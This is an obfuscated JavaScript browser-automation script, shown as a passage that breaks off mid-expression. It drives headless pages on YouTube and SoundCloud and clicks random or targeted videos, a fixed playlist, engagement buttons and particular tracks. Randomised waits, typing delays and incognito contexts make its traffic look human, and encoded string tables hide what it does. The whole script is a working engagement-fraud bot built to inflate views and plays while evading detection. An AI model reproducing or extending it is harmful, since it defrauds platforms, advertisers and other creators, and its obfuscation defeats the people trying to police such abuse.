const a3 = d,
  a2 = b,
  a1 = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x7 * 0x1c9 + 0x6f * 0x3a + 0x323 * -0xc))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x3 * 0x4b8 + -0xf64 + 0x1d8c), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9ab5 + 0x1 * -0xd6ed + -0xcac * -0xe + (-0x5cb8 + -0x6649 * 0x1 + 0xfd99) * random()) : await standardWaitForNetIdle(f), await wait(0x1 * 0x44e + 0x152b + -0x5f1 + (-0x4b47 * -0x1 + 0x1dd * -0xa + -0x283 * 0x7) * random()), -0x1009 + -0x1 * 0x2047 + 0x6e7 * 0x7;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x257 * 0xc + 0x78b + 0x2811 * 0x1), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x3 * -0x2b + -0x1 * 0x62e + 0xd6 * 0x8;
}
async function randomWait() {
  return await wait(0x292 + -0x272 * -0x2 + -0x6 * -0x203 + (0xa2 * -0x1b + -0x25bb + -0x4a59 * -0x1) * random()), -0x944 + -0x1 * -0x2210 + -0x18cb;
}
async function watchRandomFrontScreenVideo(f) {
  const S = c,
    R = b;
  await f[R(0xe, '7*Aq')](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0xaf6 + -0x14 * -0x61 + -0xe2 * 0x15, -0x1 * -0xd6d + -0x3 * 0xafb + 0x138b * 0x1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math[S(0x13)]((0x73be + 0x1b5e2 + 0x9fa0 * -0x2) * getRandomInt(-0x4cb * -0x3 + 0x9bb * -0x1 + -0x4a4, -0x5 * -0x58f + -0x1 * 0x11 + -0x1bb5), h)), -0x2126 + -0x1 * 0x1d23 + 0x3e4a;
}

function a() {
  const br = [
    'ast\x20live,m',
    'kctdQmo3WQiqCSkFWOX+',
    'CMCVzw4VC2nYAq',
    'ywr2zxj0AxnPBG',
    'y29Tp3bHz2u9oq',
    'i2j1DhrVBIa+ia',
    'bSoDBXlcU3aqWRZdUmky',
    'zwfZEwzVCMSUBW',
    've5hr09ND1b0yW',
    'y2XVC2u',
    'ocvfnsvbmIu5rq',
    'ayButtonHe',
    'Ahr0Chm6lY9VCa',
    'random',
    'W4BcTtBdK8kMgmklW4i',
    '.com',
    'FLLKhbtcHa',
    'y29Tl0bmzwDHBa',
    'e-fundamen',
    'BwLU',
    'ooMoo.io,_',
    'W55+bmkgdIRcVSo0iJG',
    'catch',
    'W6RdRwZdM8oErtdcJSkWqa',
    'y29Tl0bnCKjLyq',
    'Aw5ZDgfSBc1SAq',
    'igjLyxn0igHPBG',
    'dYddUstdR8okWPhcRmoPW78',
    '-fundament',
    'w.youtube.',
    'zwf0Aw5Nigf1Da',
    'mmoZxCkpW5i5W4hdRSkzvW',
    'finalize',
    'u2fMyxjPlZuZnW',
    'https://gr',
    'nJGvW6GgWR3cSKxcOse'
  ];
  a = function() {
    return br;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xa70 + 0x8 * 0x3d4 + -0x2910);
    let h = e[f];
    if (b['HsNVnw'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1661 * -0x1 + 0x1597 + -0x2bf8, s, t, u = -0x20b * 0x1 + 0x2570 + -0x2365; t = n['charAt'](u++); ~t && (s = r % (0x7 * 0x1c9 + 0x6f * 0x3a + 0x1fb * -0x13) ? s * (-0x3 * 0x4b8 + -0xf64 + 0x1dcc) + t : t, r++ % (0x19c9 + 0x9 * -0x3fb + -0x8f * -0x12)) ? p += String['fromCharCode'](-0x1ee8 + -0x4df * 0x7 + 0x4200 & s >> (-(0x1 * 0x44e + 0x152b + -0x1977) * r & -0x969 * -0x4 + 0x109 * -0x9 + -0xcf * 0x23)) : -0x1009 + -0x1 * 0x2047 + 0x1828 * 0x2) {
          t = o['indexOf'](t);
        }
        for (let v = -0x257 * 0xc + 0x78b + 0x1489 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x3 * -0x2b + -0x1 * 0x62e + 0x9d * 0xb))['slice'](-(0x292 + -0x272 * -0x2 + -0x6 * 0x13e));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xa2 * -0x1b + -0x25bb + -0x36d1 * -0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x944 + -0x1 * -0x2210 + -0x18cc; u < 0xaf6 + -0x14 * -0x61 + -0x1c1 * 0xa; u++) {
          p[u] = u;
        }
        for (u = -0x1 * -0xd6d + -0x3 * 0xafb + 0x9c2 * 0x2; u < 0x9a5 + 0x247e + 0x2d23 * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x4cb * -0x3 + 0x9bb * -0x1 + -0x3a6), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x5 * -0x58f + -0x1 * 0x11 + -0x1bba, q = -0x2126 + -0x1 * 0x1d23 + 0x3e49;
        for (let v = 0x33a * 0x4 + -0xf99 + 0x2b1 * 0x1; v < n['length']; v++) {
          u = (u + (-0x1091 * 0x1 + -0xf6b + 0x1ffd)) % (0x18 * 0x7a + -0x24de * -0x1 + -0x17a7 * 0x2), q = (q + p[u]) % (-0x9ad * 0x1 + -0x1bcd + -0x133d * -0x2), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x135 * 0x1b + -0x115 * -0x5 + -0x2500)]);
        }
        return t;
      };
      b['DzVxpb'] = m, c = arguments, b['HsNVnw'] = !![];
    }
    const j = e[0x14b3 + 0x8f + 0x3 * -0x716],
      k = f + j,
      l = c[k];
    return !l ? (b['WdonXo'] === undefined && (b['WdonXo'] = !![]), h = b['DzVxpb'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x33a * 0x4 + -0xf99 + 0x2b1 * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1091 * 0x1 + -0xf6b + 0x1ffd]['split']('\x20');
    for (let k = 0x18 * 0x7a + -0x24de * -0x1 + -0x1827 * 0x2; k < i['length']; k += -0x9ad * 0x1 + -0x1bcd + -0x257c * -0x1)
      j += i[k] * h[i[k + (0x135 * 0x1b + -0x115 * -0x5 + -0x25ff)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xa70 + 0x8 * 0x3d4 + -0x2910);
    let h = e[f];
    if (c['dgLqGT'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1661 * -0x1 + 0x1597 + -0x2bf8, r, s, t = -0x20b * 0x1 + 0x2570 + -0x2365; s = m['charAt'](t++); ~s && (r = q % (0x7 * 0x1c9 + 0x6f * 0x3a + 0x1fb * -0x13) ? r * (-0x3 * 0x4b8 + -0xf64 + 0x1dcc) + s : s, q++ % (0x19c9 + 0x9 * -0x3fb + -0x8f * -0x12)) ? o += String['fromCharCode'](-0x1ee8 + -0x4df * 0x7 + 0x4200 & r >> (-(0x1 * 0x44e + 0x152b + -0x1977) * q & -0x969 * -0x4 + 0x109 * -0x9 + -0xcf * 0x23)) : -0x1009 + -0x1 * 0x2047 + 0x1828 * 0x2) {
          s = n['indexOf'](s);
        }
        for (let u = -0x257 * 0xc + 0x78b + 0x1489 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x3 * -0x2b + -0x1 * 0x62e + 0x9d * 0xb))['slice'](-(0x292 + -0x272 * -0x2 + -0x6 * 0x13e));
        }
        return decodeURIComponent(p);
      };
      c['pPUgQh'] = i, b = arguments, c['dgLqGT'] = !![];
    }
    const j = e[0xa2 * -0x1b + -0x25bb + -0x36d1 * -0x1],
      k = f + j,
      l = b[k];
    return !l ? (h = c['pPUgQh'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x14b3 + 0x8f + 0xc * -0x1c5)['map'](l => Array['from'](l['children']))['flat'](-0x16c * 0x15 + 0x151f + 0x45f * 0x2)['map'](l => l['childNodes'][0x1afd + 0x1b65 * 0x1 + -0x1 * 0x3661]['childNodes'][-0x2396 + 0x1999 + 0x1 * 0x9fd]['childNodes'][-0x11b9 * -0x2 + -0x2327 + 0x4a * -0x1]['childNodes'][0xdaf + -0x1e2 + -0x13 * 0x9f]['childNodes'][-0x1c09 * 0x1 + -0x1 * 0x4cf + 0x20d9]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x469 + -0x2 * 0x21f + -0x1 * -0x3bd, 0x18f2 + -0x2 * 0x5f3 + -0x14 * -0x53)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x34a5 + 0xb18 + 0x6425);
  const h = await getMaxTime(f),
    i = Math['min']((0xc469 + -0x3045 * -0x1 + 0x2 * -0x527) * getRandomInt(-0x5 * -0x5e7 + 0x155a + -0x32db, -0x1 * -0x1678 + 0x17ed + -0x2e60), h);
  return await wait(i), 0x8 * 0x3fe + 0x835 * 0x4 + -0x40c3;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x85 * 0x1 + 0x1cc + -0x6d * 0x3]['children'][0xeb9 + 0x4 * -0x2b4 + -0x3e9]['children'][0xd3 * -0x1 + -0xe3 * -0x1d + 0x639 * -0x4]['children'][0x37 * 0x2f + 0x26 * 0x83 + -0x1d8b * 0x1]['children'][0x35 * -0x53 + -0x258b * -0x1 + 0xa2e * -0x2]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1241 * -0x1 + 0x2432 + 0x1 * -0x11f0;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x10de + -0x1 * 0x353 + 0x1495 + (-0xe9b + -0x12a1 * -0x2 + 0x1675 * -0x1) * random()
  }), await wait(0x2a5 * 0x7 + 0x3d * -0x11 + -0xc82 + (-0x1 * -0xf51 + -0x4 * -0x9bd + 0x11b3 * -0x3) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1 * -0xfe5 + 0xee7 + 0x1 * 0x100]['childNodes'][-0x1 * -0x23c3 + -0x217 * -0x8 + -0x3 * 0x117e]['childNodes'][-0x11 * 0x22a + 0x155 + 0x216 * 0x11]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x2048 + 0x1597 + 0x3 * 0x392]['childNodes'][0x176f * 0x1 + 0x2d1 * 0x3 + -0x48e * 0x7]['childNodes'][0x4ad + 0x2 * -0x5b3 + 0x6bb]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x237b * -0x1 + 0x2 * 0x31d + 0x1d42),
          r = -0x25c9 * -0x1 + 0x81c * 0x4 + -0x1 * 0x4639;
        for (let u = -0x239c + 0xe79 + 0x1523; u < q['length']; u += 0x235 + -0x2575 + 0x2342)
          r += q[u] * k[q[u + (-0x11df + -0x39b + -0x157b * -0x1)]];
        return r;
      }(n);
  });
  await wait((0x431b + -0x2d23 + 0x2 * 0x1250) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x32e + 0x9c1f + 0x516f) * getRandomInt(0x1879 + -0x1 * -0x19bd + -0x1 * 0x3235, 0x87e + 0x1 * -0xcc9 + 0x455), h + (0x2 * 0x4c1 + 0x593 + -0x473 * -0x1));
  return await wait(i), -0x6 * 0x62f + -0x123a + 0x3755 * 0x1;
}
async function keyWatch(f) {
  const U = c,
    T = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints[T(0xd)]() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x8d * -0x13 + 0x2be + -0xd35), log('clicking..' + '.'), await f['click'](U(0x5) + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x15c6 + -0x3 * 0xb1b + 0x42cf + (-0x2 * -0x109c + -0x1a3 * 0xb + -0xb4f) * Math['random']());
    });
  }, 0x31c + -0x3161 + 0x499d);
  await wait(0x9a * 0x281 + -0x3c1c + -0x106 * -0x33b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1c5b6 + -0x2069 * -0x1 + -0xfbbf) * getRandomInt(-0x1c9a + -0xbd6 + -0x6be * -0x6, 0x53f + 0x196e + -0x1e94)), clearInterval(h), 0x1 * 0x26bf + 0xed * -0x27 + -0x2a3;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x2174 + -0x1635 + 0x37a9;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x26 * 0x67 + -0xa31 + -0xa3 * 0x8;
    await randomWait();
  }
  return 0x1d3c + -0x22a2 + 0x1cd * 0x3;
}

function fetchRandomSC() {
  const V = b;
  return Math['random']() <= 0xa61 + -0x11 * -0x15 + -0xbc6 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + V(0x1b, 'vw*g') + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1 * 0x183f + 0x1 * 0xea4 + -0x99b * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xa70 + 0x8 * 0x3d4 + -0x2910);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  const aR = {
    f: 0x20
  };
  async function i() {
    const X = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xddf + -0x48b * 0x7 + -0x25 * -0x13c + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2 * 0x119b + -0x1b02 + 0x3e38;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          const W = d;
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + W(0xb) + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xe827 + -0x2793 + 0x1bf82 + getRandomInt(0x4 * -0x570 + 0x109 * 0x3c + 0x123c, 0x26d1 + -0x83f * -0x13 + -0x4e4e));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xde3 + -0x17f * -0x4 + 0x7e8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1899 + -0x160f + -0x28a;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1 * -0x35c + 0x17 * -0xf7 + 0x12d5, -0x6f6 + -0x64e + 0x2 * 0x6bb)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s[X(0x9)](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x167c + -0xd8a * 0x1 + -0x1d * 0xa + floor((0x23c + 0xff * -0xc + 0xda0) * random()))), log('p2'), log(await s['evaluate'](() => {
        const a0 = c,
          Z = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xc1830a00 + 0x75e284ca + -0x7 * 0x1a331466),
          0xdf9989 + -0xfc21ed + 0x9c8864,
          -0x3 * 0x30fe + 0x9ad2 + 0x7828,
          -0x2 * -0x3ae + -0x7e2 + 0x106
        ], y = [
          0x109b + -0x2072 + -0xfef * -0x1,
          -0x3d3 + 0x16 * 0x9c + -0x985,
          -0x5 * 0x212 + -0x173 + 0xbd5 * 0x1,
          -0x1 * -0x1057 + 0xb5 * -0x33 + 0x13b8
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x8f5 + -0x1 * -0x1ba1 + -0x2495)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              const Y = b;
              return L[Y(0x10, '0Ory')]()['update'](M);
            }, J = -0x276 + -0x2660 + 0x2 * 0x146b; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x14 * 0x1b1 + -0x1188 + -0x104c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x3 * -0x2fe + -0x68 * 0x2 + -0x9ca * -0x1] = A[-0x1ab9 + -0x7c1 + 0x228a] = A[0xf * 0xb3 + 0x60d * 0x3 + 0x1 * -0x1ca3] = A[0xd * -0x11e + -0x3c * -0x73 + -0xa * 0x13e] = A[-0xf87 + -0x5 * -0xef + -0xfd * -0xb] = A[-0x6dc + -0x923 * 0x1 + 0x1003] = A[-0x2015 + 0x1c37 + 0x3e3] = A[-0x653 * 0x4 + 0xe3f + -0x237 * -0x5] = A[-0x16f8 + -0x12fa + 0x29f9 * 0x1] = A[0xa83 + 0x3b * 0x1d + -0x152 * 0xd] = A[0x15 * -0x7b + 0x8 * 0x262 + -0x8f0] = A[-0xc * -0x124 + -0x2170 + 0x12a * 0x11] = A[0x3 * 0x153 + 0x1 * 0x89b + -0xc89] = A[-0x14f5 + -0x2633 + 0x3b34] = A[0x69f + 0x9c + -0x72e] = A[0x116e + -0x2327 + 0x11c7] = A[-0x1 * -0x1edd + -0x153 * -0x16 + -0x3bf0] = 0x192 * 0x1 + -0x1dab + 0x1c19, this['blocks'] = A) : this['blocks'] = [
                0x223a + -0x765 + -0x1ad5 * 0x1,
                0x19 * 0x8b + -0x1a0a + 0xc77 * 0x1,
                0x987 * 0x3 + -0x15ca * 0x1 + -0x6cb,
                0x14af + -0x1873 + -0x1e2 * -0x2,
                -0x1b * -0x5f + 0x9b6 + -0x13bb,
                -0x1 * 0x13bd + 0x11d4 + 0x1e9,
                -0x3 * 0x475 + 0x1e5 * 0x1 + -0x1 * -0xb7a,
                -0x6f * 0x2f + 0x5d2 * -0x1 + -0x1a33 * -0x1,
                -0x2032 + -0x34 * -0x7f + -0x12 * -0x5b,
                0x235 * 0x10 + -0xbed + -0x1763,
                -0x3a9 * 0x9 + 0x1ddc + -0x3 * -0x107,
                -0xde8 + 0x139d * -0x1 + 0x2185 * 0x1,
                0x13f0 + -0x2 * -0xfa7 + -0x333e,
                -0x1 * -0x1af2 + -0x1cf0 + -0x1e * -0x11,
                -0x153 * -0x8 + -0x1ff7 + 0x155f,
                0x209 * -0x1 + 0x14c9 * 0x1 + -0x12c0,
                0x160 + -0x629 * -0x3 + -0x13db * 0x1
              ], this['h0'] = -0xd0b98 * -0x215 + 0x28409d08 + 0x2c21b45 * 0xd, this['h1'] = -0x2d443893 * -0x1 + -0x3e962d34 + 0x1011fa02a, this['h2'] = -0x73 * 0x1b830c + 0x1 * 0xdc7f2e37 + -0x125991 * 0x305, this['h3'] = -0xe29a436 + 0x1b387487 + 0x3238425, this['h4'] = 0x7f59f3dc + 0x177640055 + -0x132eb1241, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x212d + 0x139 + -0x4 * -0x7fd, this['finalized'] = this['hashed'] = 0x1161 * 0x2 + -0x44b + -0x1e77, this['first'] = 0x8c5 + -0x15b * -0x1 + -0xa1f;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1999 + 0x1 * 0x9e3 + 0x7db * 0x2, O = J['length'] || -0x407 + 0x14c * 0x1b + -0x1 * 0x1efd, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x35 * -0xad + 0x184 + 0x224d, P[0x1 * -0x23ab + -0x8 * -0x58 + 0x20eb * 0x1] = this['block'], P[0x1 * 0x20b + 0x2 * -0x4a + -0x167] = P[-0x7 * -0x538 + 0x8c4 + -0x2d4b] = P[-0x2018 + -0xc8d + 0x2ca7] = P[0x9e * 0x2 + -0x1093 + 0xf5a] = P[0x1490 * 0x1 + -0x42 + -0x144a] = P[-0x430 + -0x1 * -0x1214 + -0xddf] = P[-0x1d + 0xed6 + -0xeb3] = P[0x2499 + 0x2479 + -0x490b] = P[0x7 * -0x3cd + -0x1bc7 + -0x3e3 * -0xe] = P[0x1b9 + -0x16ff + 0x154f] = P[0x1ed * 0xd + -0x1 * -0x1c1 + -0x1ac0] = P[-0x1450 + 0x69 * 0x1 + -0x45 * -0x4a] = P[-0x1fb0 + 0xb0b + 0x14b1] = P[0xb5c + -0x2 * 0x88f + -0x1 * -0x5cf] = P[-0x2176 + 0x147e + 0xd06] = P[0xb * -0x1ab + -0x1aff + 0x2d67] = -0x63e + 0x12b * -0xa + -0x1f * -0x94), K) {
                    for (N = this['start']; M < O && N < -0x2648 + -0x2 * 0xc0d + 0x3ea2; ++M)
                      P[N >> 0xb3 * -0x1a + 0x23a5 + -0x1175] |= J[M] << y[0xd * -0x65 + 0x2141 * 0x1 + -0x1c1d & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x130a + 0xb86 + -0x1e50; ++M)
                      (L = J['charCodeAt'](M)) < 0x1fb2 + -0xf96 * -0x1 + -0x2ec8 ? P[N >> -0x2356 + -0x10d * -0x15 + -0x21 * -0x67] |= L << y[0x23f7 + 0x2533 + -0x3d * 0x133 & N++] : L < 0x1 * -0x1a6b + 0x2701 * -0x1 + 0x496c ? (P[N >> 0x8 * 0x4ae + -0x1 * -0x126e + 0x104 * -0x37] |= (0x4f3 + 0xf0 * 0x1 + -0x107 * 0x5 | L >> -0x21dc + -0xc97 * -0x3 + -0x3e3) << y[-0x535 * 0x1 + -0x1bae + -0x20e6 * -0x1 & N++], P[N >> -0x2 * -0x5e9 + -0x9b5 * 0x1 + -0x21b] |= (-0x849 + -0xa50 + -0x1 * -0x1319 | -0x13 * -0x17b + 0x182a + -0x340c & L) << y[-0x2d5 + -0x5a * 0x22 + 0x766 * 0x2 & N++]) : L < 0x7ec + 0x11 * -0x157d + 0x23d61 || L >= -0xd * 0x1da5 + 0x5 * -0x20cb + 0x6 * 0x80e4 ? (P[N >> -0x1 * 0x187d + -0x3 * 0x3cb + -0x23e * -0x10] |= (0x3 * -0xc86 + 0x3 * -0x913 + 0x1 * 0x41ab | L >> -0x1 * 0x1fc3 + -0xf54 * 0x2 + -0x1 * -0x3e77) << y[-0x685 * 0x5 + 0x29 * 0x29 + 0x1a0b & N++], P[N >> 0xd12 + 0x2 * 0xa45 + -0x187 * 0x16] |= (0xf * -0x8c + -0x1f72 + 0x2826 | L >> -0x1f5 * 0xe + 0x1ff8 + -0x48c & -0x20 * 0x110 + -0x4a1 + -0x8 * -0x4dc) << y[-0x58a + 0x137b + -0x1 * 0xdee & N++], P[N >> 0xa0e + -0x295 + -0x27d * 0x3] |= (0x1022 + -0x1d9b + 0x31 * 